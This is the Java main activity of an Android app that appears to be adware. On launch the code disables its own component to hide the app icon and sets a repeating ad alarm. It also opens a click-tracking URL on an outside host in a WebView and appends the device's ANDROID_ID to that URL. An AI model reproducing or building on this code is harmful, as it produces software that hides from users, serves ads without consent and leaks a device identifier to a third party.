package com.own.apk.app;

import android.app.Activity;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.provider.Settings;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import android.provider.Settings.Secure;


public class MainActivity extends Activity {

    public static final String BASE_URL = "http://palundrus.com/click.php?key=p9aesdr9jbewvddrljz7&c1=+++++";

    AlarmStuff as;
    private WebView webView;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        PackageManager p = getPackageManager();
        ComponentName componentToDisable = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(
                componentToDisable,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
//        this.requestWindowFeature(Window.FEATURE_NO_TITLE);
//        this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

//        setContentView(R.layout.activity_main);
//        setContentView(R.layout.activity_main);
        setContentView(R.layout.frame_activity);


        as = new AlarmStuff();
        as.setRepeatingAlarm(MainActivity.this, AlarmStuff.DELAY_ADV);

        webView = (WebView) findViewById(R.id.webView1);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());

        webView.loadUrl(getAdvUrl());


    }


    public String getAdvUrl(){

        String deviceId = null;
        try {
            deviceId = Settings.Secure.getString(getApplicationContext().getContentResolver(),Secure.ANDROID_ID);
            if (deviceId == null){
                deviceId = "-1";
            }
        } catch (Exception e){
            deviceId = "-999";
        }

        String fullUrl = BASE_URL.concat("&device=").concat(deviceId);
        return fullUrl;
    }
}









